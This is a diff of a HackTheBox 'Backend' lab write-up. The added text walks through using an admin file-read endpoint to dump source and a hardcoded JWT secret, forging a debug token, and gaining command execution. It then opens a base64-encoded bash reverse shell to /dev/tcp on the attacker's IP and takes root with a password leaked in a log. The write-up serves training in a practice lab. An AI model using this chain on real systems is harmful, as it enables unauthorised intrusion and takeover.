@@ -1,7 +1,7 @@
 ---
 title: HackTheBox - Backend
 date: 2022-08-15 21:00:00 +0800
-categories: [HackTheBox]
+categories: [HackTheBox, Medium]
 tags: [api]
 img_path: /assets/img/machine/backend/
 ---
@@ -261,6 +261,8 @@ $ curl -s 'http://10.129.227.148/openapi.json' -H 'Authorization: Bearer [token]
 
 A complete list of endpoints! As we can imagine `/SecretFlagEndpoint` returns the flag of the user. This other endpoint `/updatepass` also catches our attention, but let's write it down for later, let's first take a look at `/admin/file` and `/admin/exec/{command}`.
 
+### Exploring admin endpoints
+
 ```bash
 $ curl -s 'http://10.129.227.148/api/v1/admin/file'        
 {"detail":"Method Not Allowed"}
@@ -328,6 +330,8 @@ $ curl -s 'http://10.129.227.148/api/v1/admin/file' -H 'Authorization: Bearer [t
 
 Great, now we can read files from the system, the next thing is to focus on the `/admin/exec/{command}` endpoint that will allow us to execute commands, but as we saw earlier, this command expects a debug variable in the `JWT`, but in order to modify it we need to know what is the key with which it has been signed. Luckily for us, we can now read files from the system and we know that it is an application made with python. Let's see if we can find some information to help us.
 
+### Dump application source code
+
 ```bash
 $ curl -s 'http://10.129.227.148/api/v1/admin/file' -H 'Authorization: Bearer [token]' -H 'Content-Type: application/json' -d '{"file": "/proc/self/environ"}' | jq      
 {
@@ -338,3 +342,187 @@ $ curl -s 'http://10.129.227.148/api/v1/admin/file' -H 'Authorization: Bearer [t
 
 When displaying the environment variables, two interesting variables are displayed `APP_MODULE=app.main:app` and `PWD=/home/htb/uhc`.
 
+Searching a little I came across [this github repository](https://github.com/tiangolo/uvicorn-gunicorn-fastapi-docker), which uses the environment variable `APP_MODULE=app.main:app` in the same way and its folder structure is `/app/main.py` so considering that our current directory is `/home/htb/uhc`, in our case the file should be in `/home/htb/uhc/app/main.py`.
+
+```bash
+$ curl -s 'http://10.129.227.148/api/v1/admin/file' -H 'Authorization: Bearer token' -H 'Content-Type: application/json' -d '{"file": "/home/htb/uhc/app/main.py"}'
+```
+{: .nolineno }
+
+```python
+[...]
+
+from app.schemas.user import User
+from app.api.v1.api import api_router
+from app.core.config import settings
+
+from app import deps
+from app import crud
+
+
+app = FastAPI(title="UHC API Quals", openapi_url=None, docs_url=None, redoc_url=None)
+root_router = APIRouter(default_response_class=UJSONResponse)
+
+
+@app.get("/", status_code=200)
+def root():
+    """
+    Root GET
+    """
+    return {"msg": "UHC API Version 1.0"}
+
+
+@app.get("/api", status_code=200)
+def list_versions():
+    """
+    Versions
+    """
+    return {"endpoints":["v1"]}
+[...]
+```
+
+The format of the import statements works with a folder structure just like `app.main`.
+
+```
+.
+├── app
+│   └── main.py
+├── api
+│   └── v1
+│       └── api.py
+└── core
+    └── config.py
+```
+
+Digging little by little among all the source files, there are two things that are necessary to continue exploiting the application, the first is to see what environment variable expects the endpoint of `/admin/exec/{command}` to execute, and the other is to see what is the key that is used to sign the `JWT`.
+
+Found in `/app/api/v1/endpoints/admin.py`
+
+```python
+@router.get("/exec/{command}", status_code=200)
+def run_command(
+    command: str,
+    current_user: User = Depends(deps.parse_token),
+    db: Session = Depends(deps.get_db)
+) -> str:
+    """
+    Executes a command. Requires Debug Permissions.
+    """
+    if "debug" not in current_user.keys():
+        raise HTTPException(status_code=400, detail="Debug key missing from JWT")
+
+    import subprocess
+
+    return subprocess.run(["/bin/sh","-c",command], stdout=subprocess.PIPE).stdout.strip()
+```
+
+Found in `/app/core/config.py`
+
+```python
+class Settings(BaseSettings):
+
+    API_V1_STR: str = "/api/v1"
+    JWT_SECRET: str = "SuperSecretSigningKey-HTB"
+    ALGORITHM: str = "HS256"
+
+    [...]
+
+settings = Settings()
+```
+
+Now we have everything we need to create our custom JWT and add our `debug` variable in it.
+
+```python
+$ python               
+Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import jwt
+>>> decoded = jwt.decode(your_token_here, "SuperSecretSigningKey-HTB", ["HS256"])
+>>> decoded["debug"] = True
+>>> token = jwt.encode(decoded, "SuperSecretSigningKey-HTB", "HS256")
+>>> token
+'your_fresh_new_token'
+```
+
+With this new token, let's try calling the `exec` endpoint again.
+
+```bash
+$ curl -s 'http://10.129.227.148/api/v1/admin/exec/id' -H 'Authorization: Bearer token'
+"uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)"
+```
+{: .nolineno }
+
+Great! now we just have to get a reverse shell, not all of them are valid but after some trial and error this one works perfectly:
+
+```bash
+$ echo -n "bash -c 'bash  -i >& /dev/tcp/10.10.14.38/4242 0>&1'" | base64
+YmFzaCAtYyAnYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzgvNDI0MiAwPiYxJw==
+
+$ curl -s 'http://10.129.227.148/api/v1/admin/exec/echo%20YmFzaCAtYyAnYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzgvNDI0MiAwPiYxJw==|base64%20-d|bash' -H 'Authorization: Bearer token' -H 'Content-Type: application/json'
+
+$ nc -nlvp 4242  
+listening on [any] 4242 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.129.227.148] 38424
+bash: cannot set terminal process group (672): Inappropriate ioctl for device
+bash: no job control in this shell
+htb@Backend:~/uhc$
+```
+
+## Shell as root
+
+If we read a little bit the python web application files, we can see a file called `auth.log` and in it we can see a strange entry:
+
+```bash
+htb@Backend:~/uhc$ ls -la
+ls -la
+total 80
+drwxrwxr-x 1 htb htb   296 Aug 19 23:41 .
+drwxr-xr-x 1 htb htb   180 Apr 10 01:36 ..
+drwxrwxr-x 1 htb htb   138 Apr  6 13:27 .git
+-rw-rw-r-- 1 htb htb    18 Apr  6 13:27 .gitignore
+drwxr-xr-x 1 htb htb    66 Apr  9 15:10 .venv
+drwxr-xr-x 1 htb htb    54 Apr 10 00:59 __pycache__
+drwxrwxr-x 1 htb htb    90 Apr  6 14:43 alembic
+-rwxrwxr-x 1 htb htb  1592 Apr  6 13:27 alembic.ini
+drwxrwxr-x 1 htb htb   218 Apr 10 01:02 app
+-rw-r--r-- 1 htb htb  1022 Aug 19 23:41 auth.log
+-rwxrwxr-x 1 htb htb   127 Apr  6 18:31 builddb.sh
+-rw-rw-r-- 1 htb htb 19353 Apr  6 13:27 poetry.lock
+-rw-rw-r-- 1 htb htb  2750 Apr 10 01:36 populateauth.py
+-rwxrwxr-x 1 htb htb   171 Apr  6 13:27 prestart.sh
+-rw-rw-r-- 1 htb htb   332 Apr  6 13:27 pyproject.toml
+-rw-rw-r-- 1 htb htb   118 Apr  9 15:10 requirements.txt
+-rwxrwxr-x 1 htb htb   241 Apr 10 01:02 run.sh
+-rw-r--r-- 1 htb htb 24576 Aug 19 23:41 uhc.db
+htb@Backend:~/uhc$ cat auth.log
+cat auth.log
+08/19/2022, 22:17:06 - Login Success for admin@htb.local
+08/19/2022, 22:20:26 - Login Success for admin@htb.local
+08/19/2022, 22:33:46 - Login Success for admin@htb.local
+08/19/2022, 22:37:06 - Login Success for admin@htb.local
+08/19/2022, 22:42:06 - Login Success for admin@htb.local
+08/19/2022, 22:45:26 - Login Success for admin@htb.local
+08/19/2022, 22:58:46 - Login Success for admin@htb.local
+08/19/2022, 23:07:06 - Login Success for admin@htb.local
+08/19/2022, 23:08:46 - Login Success for admin@htb.local
+08/19/2022, 23:15:26 - Login Success for admin@htb.local
+08/19/2022, 23:23:46 - Login Failure for Tr0ub4dor&3
+08/19/2022, 23:25:21 - Login Success for admin@htb.local
+08/19/2022, 23:25:26 - Login Success for admin@htb.local
+08/19/2022, 23:25:46 - Login Success for admin@htb.local
+08/19/2022, 23:27:06 - Login Success for admin@htb.local
+08/19/2022, 23:32:06 - Login Success for admin@htb.local
+08/19/2022, 23:38:46 - Login Success for admin@htb.local
+08/19/2022, 23:41:45 - Login Success for admin@htb.local
+```
+{: .nolineno }
+
+It seems that someone has put the password in the user field when trying to login, maybe it was root?
+
+```bash
+htb@Backend:~/uhc$ su - 
+Password: Tr0ub4dor&3
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+{: .nolineno }
